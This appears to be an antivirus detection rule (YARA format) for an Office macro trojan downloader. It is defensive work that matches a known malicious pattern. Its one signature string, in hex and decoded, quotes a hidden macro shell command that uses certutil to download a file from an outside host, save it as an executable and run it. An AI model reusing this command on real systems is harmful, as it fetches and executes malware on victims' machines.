
rule TrojanDownloader_O97M_Powdow_DPL_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.DPL!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {3d 73 68 65 6c 6c 28 22 63 6d 64 2f 63 63 65 72 74 75 74 69 6c 2e 65 78 65 2d 75 72 6c 63 61 63 68 65 2d 73 70 6c 69 74 2d 66 22 22 68 74 74 70 73 3a 2f 2f 6f 6c 75 67 75 6e 2e 63 6f 2e 7a 61 2f 68 6f 6d 65 2f 6d 69 63 6f 72 73 2e 73 63 72 22 22 72 72 77 63 6a 66 6a 67 75 70 2e 65 78 65 2e 65 78 65 26 26 72 72 77 63 6a 66 6a 67 75 70 2e 65 78 65 2e 65 78 65 22 2c 76 62 68 69 64 65 29 } //1 =shell("cmd/ccertutil.exe-urlcache-split-f""https://olugun.co.za/home/micors.scr""rrwcjfjgup.exe.exe&&rrwcjfjgup.exe.exe",vbhide)
	condition:
		((#a_01_0  & 1)*1) >=1
 
}